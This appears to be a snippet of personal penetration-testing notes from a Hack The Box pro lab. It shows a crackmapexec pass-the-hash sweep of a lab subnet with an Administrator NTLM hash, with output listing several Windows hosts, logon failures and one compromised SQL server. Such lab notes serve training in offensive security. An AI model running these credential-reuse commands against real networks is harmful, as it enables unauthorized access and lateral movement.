```bash
┌──(kali㉿gobots)-[04Apr2024 00:47:35]-[~/SUT/Genesis_proLab_htB/malware]
└─$ crackmapexec smb 10.10.110.0/24 -u Administrator -H 4ea0a7f436ca91d350aa88c1377a7387 --local-auth                                                                                                        
SMB         10.10.110.20    445    WS01-ERIS        [*] Windows 10.0 Build 18362 x64 (name:WS01-ERIS) (domain:WS01-ERIS) (signing:False) (SMBv1:False)
SMB         10.10.110.5     445    SRV01-ARTEMIS    [*] Windows 10.0 Build 17763 x64 (name:SRV01-ARTEMIS) (domain:SRV01-ARTEMIS) (signing:False) (SMBv1:False)
SMB         10.10.110.25    445    WS02-ATHENA      [*] Windows 10.0 Build 19041 x64 (name:WS02-ATHENA) (domain:WS02-ATHENA) (signing:False) (SMBv1:False)
SMB         10.10.110.3     445    DC01-PHOBOS      [*] Windows 10.0 Build 17763 x64 (name:DC01-PHOBOS) (domain:DC01-PHOBOS) (signing:True) (SMBv1:False)
SMB         10.10.110.20    445    WS01-ERIS        [-] WS01-ERIS\Administrator:4ea0a7f436ca91d350aa88c1377a7387 STATUS_LOGON_FAILURE 
SMB         10.10.110.5     445    SRV01-ARTEMIS    [-] SRV01-ARTEMIS\Administrator:4ea0a7f436ca91d350aa88c1377a7387 STATUS_LOGON_FAILURE 
SMB         10.10.110.25    445    WS02-ATHENA      [-] WS02-ATHENA\Administrator:4ea0a7f436ca91d350aa88c1377a7387 STATUS_LOGON_FAILURE 
SMB         10.10.110.3     445    DC01-PHOBOS      [-] DC01-PHOBOS\Administrator:4ea0a7f436ca91d350aa88c1377a7387 STATUS_LOGON_FAILURE 
SMB         10.10.110.58    445    SQL01-HERA       [*] Windows Server 2016 Standard 14393 x64 (name:SQL01-HERA) (domain:SQL01-HERA) (signing:False) (SMBv1:True)
SMB         10.10.110.58    445    SQL01-HERA       [+] SQL01-HERA\Administrator:4ea0a7f436ca91d350aa88c1377a7387 (Pwn3d!)
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [*] Windows Server 2012 R2 Standard 9600 x64 (name:WEBWIN01-APOLLO) (domain:WEBWIN01-APOLLO) (signing:False) (SMBv1:True)
SMB         10.10.110.213   445    WEBWIN01-APOLLO  [-] WEBWIN01-APOLLO\Administrator:4ea0a7f436ca91d350aa88c1377a7387 STATUS_LOGON_FAILURE 

```

![[Pasted image 20240403205108.png]]